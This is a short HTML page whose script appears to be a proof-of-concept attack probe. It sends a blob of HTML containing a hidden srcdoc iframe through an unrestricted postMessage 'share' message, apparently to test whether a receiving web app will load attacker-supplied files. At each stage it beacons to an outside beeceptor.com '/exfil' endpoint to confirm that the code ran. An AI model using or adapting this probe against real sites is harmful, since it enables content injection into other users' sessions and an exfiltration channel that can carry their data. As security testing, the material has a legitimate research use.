<!doctype html>
<html>
<body>
<script>
/* ping : page externe chargée */
new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';

(async () => {
  /* HTML du blob — AUCUN script direct, seulement un iframe srcdoc */
  const epic = `
    <html><body>
      <iframe style="display:none"
              srcdoc="
                <script>
                  parent.postMessage('blob_start','*');
                <\/script>
              ">
      </iframe>
    </body></html>`;

  const blob = new Blob([epic], {type:'text/html'});

  window.addEventListener('message', e => {
    if (e.data === 'blob_start') {
      new Image().src =
        'https://webtest.free.beeceptor.com/exfil?f=blob_start';
    }
  });

  window.postMessage({
    type:'share',
    files:[{blob, name:'probe.html', cached:false}]
  }, '*');

  new Image().src =
    'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
})();
</script>
</body>
</html>
